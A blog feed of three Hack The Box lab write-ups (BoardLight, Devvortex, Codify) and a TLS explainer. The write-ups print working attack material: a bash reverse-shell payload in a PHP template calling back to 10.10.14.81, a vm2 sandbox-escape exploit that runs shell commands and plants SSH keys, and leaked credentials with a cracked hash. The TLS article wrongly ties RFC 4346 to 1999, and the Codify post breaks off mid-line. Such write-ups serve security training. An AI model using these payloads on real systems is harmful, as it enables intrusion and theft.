[
  
  {
    "title": "Hack The Box | BoardLight Writeup",
    "url": "/posts/htb-BoardLight-writeup/",
    "categories": "Blogging, Writeup, Hack The Box",
    "tags": "BoardLight, HTB, Writeup, Easy",
    "date": "2024-09-27 23:00:00 +0530",
    





    
    "snippet": "Summary:In this challenge, I explored and exploited a subdomain hosting Dolibarr CRM. After conducting some research, I was able to gain access using default credentials. Through further enumeratio...",
    "content": "Summary:In this challenge, I explored and exploited a subdomain hosting Dolibarr CRM. After conducting some research, I was able to gain access using default credentials. Through further enumeration, I identified a vulnerability within the version of Dolibarr that allowed remote code execution, granting me an initial foothold.Upon obtaining a reverse shell, I explored the system and found SSH credentials, allowing me to escalate to a user shell. Running a privilege escalation script revealed an SUID vulnerability in Enlightenment, which I successfully exploited to gain root access to the machine.Enumeration:Port Scan:I began with an Nmap scan to discover open ports.# Nmap 7.94SVN scan initiated Wed Sep 25 19:45:12 2024 as: nmap -sV -A -p- -T5 -oA bordlight 10.10.11.11Warning: 10.10.11.11 giving up on port because retransmission cap hit (2).Nmap scan report for 10.10.11.11Host is up (0.24s latency).Not shown: 65000 closed tcp ports (reset), 533 filtered tcp ports (no-response)PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))|_http-title: Site doesn't have a title (text/html; charset=UTF-8).|_http-server-header: Apache/2.4.41 (Ubuntu)Aggressive OS guesses: Linux 5.0 (97%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTE (using port 3306/tcp)HOP RTT       ADDRESS1   234.20 ms 10.10.14.12   235.61 ms 10.10.11.11OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Wed Sep 25 19:53:53 2024 -- 1 IP address (1 host up) scanned in 521.92 secondsNot much here other than port 80 running Apache and SSH on the default port 22. We’ll leave this for now and initiate another scan later if needed.Visiting the web application at http://10.10.11.11/ doesn’t provide much information. Web applicationI added board.htb to our /etc/hosts file, associating it with the IP address, so we can access the domain in our browser.Web Directory Discovery:Using ffuf, I started fuzzing for subdomains. Initially, the scan resulted in too many responses, all with a size of 15949. I modified my command to filter out response size 15949.ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt  -u http://board.htb/ -H 'Host: FUZZ.board.htb' -c  -fs 15949        /'___\\  /'___\\           /'___\\              /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/              \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\              \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/               \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\                 \\/_/    \\/_/   \\/___/    \\/_/              v2.1.0-dev________________________________________________ :: Method           : GET :: URL              : http://board.htb/ :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt :: Header           : Host: FUZZ.board.htb :: Follow redirects : false :: Calibration      : false :: Timeout          : 10 :: Threads          : 40 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500 :: Filter           : Response size: 15949________________________________________________crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 262ms]:: Progress: [19966/19966] :: Job [1/1] :: 155 req/sec :: Duration: [0:02:03] :: Errors: 0 ::With right filters I was able to identify a subdomain crm which i added to out hostfile.Foothold:After identifying the subdomain crm, I added it to the /etc/hosts file to facilitate easy access. Visiting the subdomain at crm.board.htb revealed that the application was running Dolibarr CRM. Dolibarr CRMWith some research, I was able to discover the default login credentials for Dolibarr CRM and successfully logged in. However, the interface didn’t provide many useful functions that could be directly leveraged for further exploitation.  Dolibarr ERP CRM is an open-source software package designed for companies, foundations, and freelancers. It offers a range of features for enterprise resource planning (ERP) and customer relationship management (CRM), as well as other functionalities for various business activities.Further research into the version of Dolibarr revealed a known vulnerability CVE-2023-30253, which enables remote code execution by an authenticated user. This vulnerability occurs due to an uppercase manipulation in PHP tags, where &lt;?PHP can bypass some security filters that expect the lowercase variant &lt;?php.I found a Proof of Concept (PoC) for this vulnerability and used it to inject malicious code into the application. Once executed, this successfully provided me with a reverse shell, establishing foothold on the system.Privilege Escalation:To User Access:After obtaining the reverse shell, I performed further enumeration to gather more information about the system. During this process, I navigated to the Dolibarr configuration folder, where I discovered a PHP configuration file that contained the database connection details.www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ lslsconf.phpconf.php.exampleconf.php.oldwww-data@boardlight:~/html/crm.board.htb/htdocs/conf$ cat conf.phpcat conf.php&lt;?php//// File generated by Dolibarr installer 17.0.0 on May 13, 2024//// Take a look at conf.php.example file for an example of conf.php file// and explanations for all possibles parameters.//$dolibarr_main_url_root='http://crm.board.htb';$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';$dolibarr_main_url_root_alt='/custom';$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';$dolibarr_main_db_host='localhost';$dolibarr_main_db_port='3306';$dolibarr_main_db_name='dolibarr';$dolibarr_main_db_prefix='llx_';$dolibarr_main_db_user='dolibarrowner';$dolibarr_main_db_pass='serverfun2$2023!!';$dolibarr_main_db_type='mysqli';$dolibarr_main_db_character_set='utf8';$dolibarr_main_db_collation='utf8_unicode_ci';// Authentication settings$dolibarr_main_authentication='dolibarr';//$dolibarr_main_demo='autologin,autopass';// Security settings$dolibarr_main_prod='0';$dolibarr_main_force_https='0';$dolibarr_main_restrict_os_commands='mysqldump, mysql, pg_dump, pgrestore';$dolibarr_nocsrfcheck='0';$dolibarr_main_instance_unique_id='ef9a8f59524328e3c36894a9ff0562b5';$dolibarr_mailing_limit_sendbyweb='0';$dolibarr_mailing_limit_sendbycli='0';//$dolibarr_lib_FPDF_PATH='';//$dolibarr_lib_TCPDF_PATH='';//$dolibarr_lib_FPDI_PATH='';//$dolibarr_lib_TCPDI_PATH='';//$dolibarr_lib_GEOIP_PATH='';//$dolibarr_lib_NUSOAP_PATH='';//$dolibarr_lib_ODTPHP_PATH='';//$dolibarr_lib_ODTPHP_PATHTOPCLZIP='';//$dolibarr_js_CKEDITOR='';//$dolibarr_js_JQUERY='';//$dolibarr_js_JQUERY_UI='';//$dolibarr_font_DOL_DEFAULT_TTF='';//$dolibarr_font_DOL_DEFAULT_TTF_BOLD='';$dolibarr_main_distrib='standard';www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ After discovering the database credentials, I checked the home directory and found a single user named larissa. Based on the likelihood of password reuse, I attempted to log in via SSH using the credentials from the database.The attempt was successful, and I was able to log in as larissa, thus gaining full access to the user’s account and ownership of the system at the user level.kasyap@Kalki:~$ ssh larissa@10.10.11.11larissa@10.10.11.11's password: Last login: Sun Sep 29 07:41:32 2024 from 10.10.14.95larissa@boardlight:~$ id uid=1000(larissa) gid=1000(larissa) groups=1000(larissa),4(adm)larissa@boardlight:~$ lsFrom User to Root:With the user shell access, I proceeded to perform privilege escalation by downloading and running LinPEAS, a Linux enumeration tool. The scan results revealed some interesting files with SUID permissions, one of which was particularly noteworthy:====================================( Interesting Files )=====================================[+] SUID[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands/usr/lib/eject/dmcrypt-get-device/usr/lib/xorg/Xorg.wrap/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/openssh/ssh-keysignThis file belongs to Enlightenment, a lightweight window manager for Linux. Upon checking the version, it was identified as 0.23.1.larissa@boardlight:~$ enlightenment --versionESTART: 0.00001 [0.00001] - Begin StartupESTART: 0.00005 [0.00004] - Signal TrapESTART: 0.00006 [0.00001] - Signal Trap DoneESTART: 0.00009 [0.00003] - Eina InitESTART: 0.00037 [0.00028] - Eina Init DoneESTART: 0.00039 [0.00002] - Determine PrefixESTART: 0.00054 [0.00015] - Determine Prefix DoneESTART: 0.00056 [0.00002] - Environment VariablesESTART: 0.00057 [0.00001] - Environment Variables DoneESTART: 0.00058 [0.00001] - Parse ArgumentsVersion: 0.23.1E: Begin Shutdown Procedure!With further enumeration, I discovered that Enlightenment version 0.23.1 has a known vulnerability, CVE-2022-37706, which could allow local users to escalate their privileges.The vulnerability exists due to the enlightenment_sys SUID binary, which mishandles path names starting with the /dev/.. substring. This flaw allows local users to execute arbitrary commands with elevated privileges.I downloaded the publicly available Proof of Concept (PoC) for this vulnerability by hosting it on a Python HTTP server and transferring it to the target machine.After running the exploit, I successfully gained root access:larissa@boardlight:~$ bash exploit.shCVE-2022-37706[*] Trying to find the vulnerable SUID file...[*] This may take few seconds...[+] Vulnerable SUID binary found![+] Trying to pop a root shell![+] Enjoy the root shell :)mount: /dev/../tmp/: can't find in /etc/fstab.# iduid=0(root) gid=0(root) groups=0(root),4(adm),1000(larissa)"
  },
  
  {
    "title": "Exploring TLS: Securing TCP Communication",
    "url": "/posts/exploring_tls_securing_tcp_communication/",
    "categories": "Blogging, Writeup, Cybersecurity",
    "tags": "Blogging, Tutorial, Writeup, TLS, Secure, TCP",
    "date": "2024-09-21 23:00:00 +0530",
    





    
    "snippet": "What is TLS?Transport Layer Security (TLS) is a cryptographic protocol that provides privacy and data security for communication over the internet. TLS is the successor to SSL (Secure Sockets Layer...",
    "content": "What is TLS?Transport Layer Security (TLS) is a cryptographic protocol that provides privacy and data security for communication over the internet. TLS is the successor to SSL (Secure Sockets Layer) and is primarily used to encrypt communication between web applications and servers.If you’ve ever made a purchase online using your credit or debit card, the communication between your browser and the server for this transaction was almost certainly protected by TLS.While this example highlights one common use case, TLS applications extend far beyond online purchases. TLS is most used to secure HTTP transactions, but since it operates over TCP, it can also be used by other applications that rely on TCP for communication, such as email protocols (SMTP, IMAP, POP3), and even Voice over IP (VoIP) communications.TLS was first proposed by the Internet Engineering Task Force (IETF) in 1999 with RFC 4346, and the most recent version, TLS 1.3, was published in 2018.How TLS works?To better understand how TLS secures communication, we can break down its operation into three key phases: Handshake, Key Derivation, and Data Transfer.Handshake:The handshake process is the first step in establishing a secure connection between the client (e.g., your browser) and the server. During this phase, both parties agree on cryptographic algorithms and exchange keys.  ClientHello: The client sends a “hello” message to the server, which includes supported cryptographic algorithms and a randomly generated number.  ServerHello: The server responds with its choice of algorithm, its certificate (to prove its identity), and its own random number.  Authentication and Pre-Master Secret: If the client trusts the server’s certificate, it encrypts a pre-master secret using the server’s public key and sends it to the server. Only the server can decrypt this secret with its private key. TLS Handshake  In TLS 1.3, the handshake has been simplified, reducing the number of round trips, making the connection establishment faster compared to TLS 1.2.Key DerivationOnce both parties have exchanged the premaster secret, they use this value along with the random numbers exchanged during the handshake (client random and server random) to derive the master secret. From the master secret, the client and server generate the symmetric keys, message authentication codes (MAC) keys, and sometimes Initialization Vectors (IVs) for certain encryption modes. These keys will be used to encrypt, decrypt, and authenticate the actual data, ensuring confidentiality and integrity for the duration of the session.  Initialization Vectors (IVs) are critical for block cipher modes like CBC (Cipher Block Chaining) because they help ensure that identical plaintext blocks produce different ciphertext blocks, enhancing security.Data TransferWith the handshake and key derivation complete, secure data transfer can begin. All further communication between the client and server is encrypted using the symmetric key. TLS ensures not only encryption but also integrity, using MACs or Authenticated Encryption with Associated Data (AEAD) to detect tampering and prevent unauthorized modifications.At the end of the session, both the client and server can agree to terminate the connection, clearing the session keys to prevent reuse in future sessions, which helps maintain forward secrecy if supported (e.g., with ECDHE key exchange).  Forward secrecy ensures that even if the private key of the server is compromised in the future, past sessions remain secure because they rely on ephemeral key exchange methods like ECDHE.Deeper dive into HandshakeTLS does not mandate the use of specific symmetric or asymmetric algorithms; instead, it allows the client and server to negotiate and agree on cryptographic algorithms at the beginning of the session. The detailed steps of the TLS handshake are as follows:  ClientHello: The client sends a list of supported cryptographic algorithms (cipher suites), including symmetric ciphers (like AES or ChaCha20), key exchange methods (like RSA or ECDHE), and MAC algorithms. The client also sends a random value, called the client nonce (or client random).  A typical TLS cipher suite looks like this: TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384      ServerHello: The server selects a cipher suite from the client’s list, specifying the symmetric algorithm (e.g., AES), the public key algorithm (e.g., RSA or ECDHE), and the MAC algorithm (e.g., HMAC-SHA256). The server also sends its digital certificate containing its public key, and a server nonce (server random).        Certificate Verification: The client verifies the server’s certificate, ensuring it was issued by a trusted Certificate Authority (CA) and that it matches the server’s identity. The client then extracts the server’s public key from the certificate.    Pre-Master Secret Exchange:          In RSA key exchange, the client generates a premaster secret, encrypts it with the server’s public key, and sends it to the server.      In ECDHE (Elliptic Curve Diffie-Hellman Ephemeral) key exchange, the client and server exchange Diffie-Hellman parameters to securely compute a shared  premaster secret without directly transmitting it over the network.              In modern TLS versions (like 1.3), RSA key exchange is deprecated in favor of ephemeral Diffie-Hellman methods, which provide forward secrecy.            Master Secret Generation:   Both the client and server use the premaster secret along with the client and server random values to compute the master secret. From the master secret, they independently derive the symmetric encryption keys, MAC keys, and IVs (if needed). These keys are used for encrypting and authenticating the session data.    Finished Messages:          The client sends a Finished message, containing a MAC of all handshake messages up to this point, encrypted with the new symmetric key.      The server also sends a Finished message, similarly, containing a MAC of the handshake messages.        Secure Communication: Once the Finished messages are successfully exchanged, the handshake is complete, and secure data transfer can begin. All further messages are encrypted and authenticated using the negotiated cipher suite.Summary:TLS provides a robust and widely used method for securing communication across the internet. By utilizing a combination of encryption, integrity verification, and authentication, TLS ensures that data is protected from interception, tampering, and unauthorized access. Understanding the TLS handshake and how keys are derived helps clarify why it’s such a critical protocol for internet security today."
  },
  
  {
    "title": "Hack The Box | Devvortex Writeup",
    "url": "/posts/htb-devvortex-writeup/",
    "categories": "Blogging, Writeup, Hack The Box",
    "tags": "Devvortex, HTB, Writeup",
    "date": "2024-04-27 21:00:00 +0530",
    





    
    "snippet": "SummaryDevvortex, a beginner-friendly Linux machine, is vulnerable thanks to its Joomla CMS having an information disclosure flaw. This vulnerability exposes configuration data, including login cre...",
    "content": "SummaryDevvortex, a beginner-friendly Linux machine, is vulnerable thanks to its Joomla CMS having an information disclosure flaw. This vulnerability exposes configuration data, including login credentials for the Joomla administrator account. By exploiting this access, an attacker can modify the Joomla template to embed malicious PHP code, ultimately gaining complete control over the system through a shell. Further investigation reveals hashed passwords within the database. Cracking these passwords unlocks SSH access to the machine. Finally, by exploiting a privilege escalation vulnerability in the apport-cli tool, the attacker gains full root access.Enumeration:Port Scan:As always my first approch is to run an nmap scan to see types of services enabled.# Nmap 7.94SVN scan initiated Thu Feb  1 21:21:26 2024 as: nmap -sV -A -T5 -oA 10.129.229.146 10.129.229.146Nmap scan report for 10.129.229.146Host is up (0.23s latency).Not shown: 998 closed tcp ports (conn-refused)PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)80/tcp open  http    nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://devvortex.htb/Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Thu Feb  1 21:21:55 2024 -- 1 IP address (1 host up) scanned in 29.15 secondsNothing much here just port 80 with NGINX and SSH on default 22, i will settele with my scan for now and will initiate another one if needed later on.Up on visitng the web application I had to add the host entry to hosts file.echo \"10.129.229.146    devvorotex.htb\" &gt;&gt; /etc/hostsDirectory Enumeration:I stared ffuf to fuzz out any subdomains as below.ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://devvortex.htb -H \"Host: FUZZ.devvortex.htb\" -mc 200 FUZZING for SubdomainsFound dev.devvoertex.htb and have added it to my /etc/hosts and proceeded to explore the site.Meanwhile, I ran ffuf again to see if we have any hidden web content.ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://dev.devvortex.htb/FUZZ Reveling hidden web contentI went ahead and pivoted to administrator page and notices its using joomla CMS. Joomla CMSInitial Step:With a quick google search, I could learn that there is a code execution vulnerability CVE-2023-23752.The Joomla versions 4.0.0 through 4.2.7 are affected with improper access check vulnerability. Allowing us to leak MySQL database credentials.curl -v http://dev.devvortex.htb/api/index.php/v1/config/application?public=true exploiting the vulnerablityLeveraging the vulnerability, I was able to retrieve the credentials for Joomla Administrator. Admin AccessI know that we can modify PHP templates in such CMS and can gain reverse shell. Lets try !So, I went ahead to System -&gt; Templates -&gt; Administrator Templates -&gt; Atum -&gt; login.php and added my payload and saved the template. PHP reverse shellPayload used for reverse shell.exec(\"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.81/4444 0&gt;&amp;1'\")Stared netcat listener on my host machine and browsed to login.phpnc -lvnp 4444 PHP reverse shellI received the shell but seems like needing to stabalize it.python -c 'import pty; pty.spawn(\"/bin/bash\")'Ctrl-Zstty raw -echo; fg#Press Enter twice, and type the command export TERM=xterm   While you enter ctrl-z you will see a session suspended message. no worries it just backgrounds the terminal, and you will regain the session once you enter fg and the view will be fixed with export TERM=xtermPrivilege Escalation:To User Access:With our initial exploit we were able to leal MySQl DB credentials. With out wasting time I went ahead and tried logging in to MySQLmysql -u lewis -pReviewing the database joomla I was able to retrive the user credential user logan from table sd4fg_users Db user table dumpThe password is hashed with ‘bcrypt’ hashing mechanism, so I went ahead and saved hash in a text file and ran hashcat.hashcat -m 3200 -a 0 hash.txt /usr/share/worlist/rockyou.txt hashcatThe password was cracked in an instant, so I SSHed into the box with the cracked credentials.We own the USER of this Machine.From User to Root:The first thing i do is to check the users sudo privileges:sudo -lWith which, I learned  that I (now the user) can run apport-cli  with root privileges. approt-cliI simply googled to get more understanding and found out privilege escalation vulnerability CVE-2023-1326 in apport-cli, that could alow me to pivot to root.The version on this machine is older and is vulnerable. Hence, I went ahead and ran the command sudo /usr/bin/apport-cli to see the options and if i can populate the report as mentioned in POC.logan@devvortex:~$ sudo /usr/bin/apport-cli --helpUsage: apport-cli [options] [symptom|pid|package|program path|.apport/.crash file]Options:  -h, --help            show this help message and exit  -f, --file-bug        Start in bug filing mode. Requires --package and an                        optional --pid, or just a --pid. If neither is given,                        display a list of known symptoms. (Implied if a single                        argument is given.)  -w, --window          Click a window as a target for filing a problem                        report.  -u UPDATE_REPORT, --update-bug=UPDATE_REPORT                        Start in bug updating mode. Can take an optional                        --package.  -s SYMPTOM, --symptom=SYMPTOM                        File a bug report about a symptom. (Implied if symptom                        name is given as only argument.)  -p PACKAGE, --package=PACKAGE                        Specify package name in --file-bug mode. This is                        optional if a --pid is specified. (Implied if package                        name is given as only argument.)  -P PID, --pid=PID     Specify a running program in --file-bug mode. If this                        is specified, the bug report will contain more                        information.  (Implied if pid is given as only                        argument.)  --hanging             The provided pid is a hanging application.  -c PATH, --crash-file=PATH                        Report the crash from given .apport or .crash file                        instead of the pending ones in /var/crash. (Implied if                        file is given as only argument.)  --save=PATH           In bug filing mode, save the collected information                        into a file instead of reporting it. This file can                        then be reported later on from a different machine.  --tag=TAG             Add an extra tag to the report. Can be specified                        multiple times.  -v, --version         Print the Apport version number.With the -f option i will able to file a bug report on below choices.logan@devvortex:~$ sudo /usr/bin/apport-cli -f*** What kind of problem do you want to report?Choices:  1: Display (X.org)  2: External or internal storage devices (e. g. USB sticks)  3: Security related problems  4: Sound/audio related problems  5: dist-upgrade  6: installation  7: installer  8: release-upgrade  9: ubuntu-release-upgrader  10: Other problem  C: CancelPlease choose (1/2/3/4/5/6/7/8/9/10/C): 1*** Collecting problem informationThe collected information can be sent to the developers to improve theapplication. This might take a few minutes.*** What display problem do you observe?Choices:  1: I don't know  2: Freezes or hangs during boot or usage  3: Crashes or restarts back to login screen  4: Resolution is incorrect  5: Shows screen corruption  6: Performance is worse than expected  7: Fonts are the wrong size  8: Other display-related problem  C: CancelPlease choose (1/2/3/4/5/6/7/8/C): 2*** To debug X freezes, please see https://wiki.ubuntu.com/X/Troubleshooting/FreezePress any key to continue... Following through the choices, I was able to generate a report that leads to its pager and escalate my self with calling /bin/bash...dpkg-query: no packages found matching xorg..............*** Send problem report to the developers?After the problem report has been sent, please fill out the form in theautomatically opened web browser.What would you like to do? Your options are:  S: Send report (1.4 KB)  V: View report  K: Keep report file for sending later or copying to somewhere else  I: Cancel and ignore future crashes of this program version  C: CancelPlease choose (S/V/K/I/C): v exploiting the vulnerability  Vulnerability: Less is configured as the pager in apport-cli allowing us to set: the terminal size.Once I hit the enter key after typing the command !/bin/bash the pager closed leaving a escalated shell to root. whoami - Root!We have the machine ROOTED!"
  },
  
  {
    "title": "Hack The Box | Codify Writeup",
    "url": "/posts/htb-codify-writeup/",
    "categories": "Blogging, Writeup, Hack The Box",
    "tags": "Codify, HTB, Writeup, Easy",
    "date": "2024-04-06 23:00:00 +0530",
    





    
    "snippet": "Summary:Codify is a beginner-friendly Linux machine, offering a web application for testing Node.js code. However, the application has a weakness in its vm2 library, allowing attackers to remotely ...",
    "content": "Summary:Codify is a beginner-friendly Linux machine, offering a web application for testing Node.js code. However, the application has a weakness in its vm2 library, allowing attackers to remotely execute code on the system. By exploring the target system, we can find a SQLite database with a hashed password. Cracking this hash unlocks SSH access to the machine. Finally, a vulnerable Bash script with elevated privileges can be exploited to reveal the root password, granting complete control over the machine.`Enumeration:Port Scan:Lets start with nmap scan to discover some open ports.# Nmap 7.80 scan initiated Tue Jan 30 21:27:02 2024 as: nmap -A -T5 -sV -Pn -oA 10.129.28.48 10.129.28.48Nmap scan report for 10.129.28.48Host is up (0.24s latency).Not shown: 997 closed portsPORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)80/tcp   open  http    Apache httpd 2.4.52|_http-server-header: Apache/2.4.52 (Ubuntu)|_http-title: Did not follow redirect to http://codify.htb/3000/tcp open  http    Node.js Express framework|_http-title: CodifyAggressive OS guesses: Linux 2.6.32 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%), Linux 3.7 - 3.10 (92%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsService Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTE (using port 3306/tcp)HOP RTT       ADDRESS1   244.12 ms 10.10.14.12   244.47 ms 10.129.28.48OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Tue Jan 30 21:27:31 2024 -- 1 IP address (1 host up) scanned in 28.56 secondsNmap scan reavled TCP ports listening on 22(SSH), 80(HTTP) and 3000 (Node.js Express framework)WebAs we have http on port 80 enabled, I went ahead and tried browsing with IP address which redirected to codify.htb I added the host entry to /etc/hosts file so we can resolve the domain and access the website. codify.htbNow accessing the web page, we see an application that provide a test environment for Node.js Upon click try me now button we land to a page that has a text editor where we can input node.js code and display its output. editorFurther enumerating we see About Us page provides information on use of vm2 library. This library is used to create sandboxes (isolated environment) allowing us to execute untrusted codes security. vm2 libraryFoothold:A quick google search for vulnerability associated to vm2 library landed me to a blog post on bleeping computer.The vulnerability exists in exception sanitization of vm2 for versions up to 3.9.16, allowing attackers to raise an unsensitized host exception inside handleException() which can be used to escape the sandbox and run arbitrary code in host machine.This vulnerability can be exploited by using elow PoC.const {VM} = require(\"vm2\");const vm = new VM();const code = `err = {};const handler = {    getPrototypeOf(target) {        (function stack() {            new Error().stack;            stack();        })();    }};  const proxiedErr = new Proxy(err, handler);try {    throw proxiedErr;} catch ({constructor: c}) {    c.constructor('return process')().mainModule.require('child_process').execSync('touch pwned');}`console.log(vm.run(code));If we run this JavaScript code on the editor page, we see that it executes successfully and list out the folder directory and ownership. ls -laAs we know that we can read files from /home/svc let us try to put an SSH public key onto ~/.ssh/authorized_keys file.To do so we will use echo “SSH key &gt;&gt; ~/.ssh/authorized_keys”, below modifed exploit code.```bashconst {VM} = require(\"vm2\");const vm = new VM();const code = `err = {};const handler = {    getPrototypeOf(target) {        (function stack() {            new Error().stack;            stack();        })();    }};  const proxiedErr = new Proxy(err, handler);try {    throw proxiedErr;} catch ({constructor: c}) {    c.constructor('return process')().mainModule.require('child_process').execSync('echo \"\" &gt;&gt; ~/.ssh/autorized_keys');}`console.log(vm.run(code));Once we had the public key in place, I used the private key and was able to login to machine through SSH as SVC user. SSH to SVCPrivilege Escalation:To User Access:With few enumerations I came across the web directories and could see an SQLite data base file under /var/www/contacts folder.svc@codify:/var/www/contact$ strings tickets.db SQLite format 3otableticketsticketsCREATE TABLE tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT)PYtablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)\ttableusersusersCREATE TABLE users (        id INTEGER PRIMARY KEY AUTOINCREMENT,         username TEXT UNIQUE,         password TEXT    ))indexsqlite_autoindex_users_1usersjoshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2joshuausersticketsJoe WilliamsLocal setup?I use this site lot of the time. Is it possible to set this up locally? Like instead of coming to this site, can I download this and set it up in my own computer? A feature like that would be nice.openTom HanksNeed networking modulesI think it would be better if you can implement a way to handle network-based stuff. Would help me out a lot. Thanks!opensvc@codify:/var/www/contact$ We could transfer the file to our system using Nmap however I went ahead and tried strings command which reveals hashed password for user Joshua.I saved the hash into a text file and used hashcat to crack the bcrypt hashed password.Hashes: 1 digests; 1 unique digests, 1 unique saltsBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotatesRules: 1Optimizers applied:* Zero-Byte* Single-Hash* Single-SaltWatchdog: Temperature abort trigger set to 90cHost memory required for this attack: 4 MBDictionary cache built:* Filename..: /home/kasyap/Downloads/rockyou.txt* Passwords.: 14344391* Bytes.....: 139921497* Keyspace..: 14344384* Runtime...: 1 sec$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1                                                          Session..........: hashcatStatus...........: CrackedHash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))Hash.Target......: $2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLH.../p/Zw2Time.Started.....: Wed Apr 10 20:57:23 2024 (7 secs)Time.Estimated...: Wed Apr 10 20:57:30 2024 (0 secs)Kernel.Feature...: Pure KernelGuess.Base.......: File (/home/kasyap/Downloads/rockyou.txt)Guess.Queue......: 1/1 (100.00%)Speed.#2.........:      234 H/s (8.01ms) @ Accel:32 Loops:16 Thr:16 Vec:1Recovered........: 1/1 (100.00%) DigestsProgress.........: 1536/14344384 (0.01%)Rejected.........: 0/1536 (0.00%)Restore.Point....: 1024/14344384 (0.01%)Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:4080-4096Candidate.Engine.: Device GeneratorCandidates.#2....: kucing -&gt; mexico1Hardware.Mon.#2..: Temp: 36c Fan:  0% Util: 45% Core:2505MHz Mem:  96MHz Bus:16With the password cracked we are now able to login to machine as Joshua and read the user flag.kasyap@Brahma:~/Kalki/HTB/codify$ ssh joshua@codify.htbjoshua@codify.htb's password: Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage  System information as of Wed Apr 10 03:30:45 PM UTC 2024  System load:                      0.0  Usage of /:                       63.6% of 6.50GB  Memory usage:                     21%  Swap usage:                       0%  Processes:                        237  Users logged in:                  1  IPv4 address for br-030a38808dbf: 172.18.0.1  IPv4 address for br-5ab86a4e40d0: 172.19.0.1  IPv4 address for docker0:         172.17.0.1  IPv4 address for eth0:            10.129.203.244  IPv6 address for eth0:            dead:beef::250:56ff:feb0:a5bExpanded Security Maintenance for Applications is not enabled.0 updates can be applied immediately.Enable ESM Apps to receive additional future security updates.See https://ubuntu.com/esm or run: sudo pro statusThe list of available updates is more than a week old.To check for new updates run: sudo apt updateFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settingsLast login: Wed Mar 27 13:01:24 2024 from 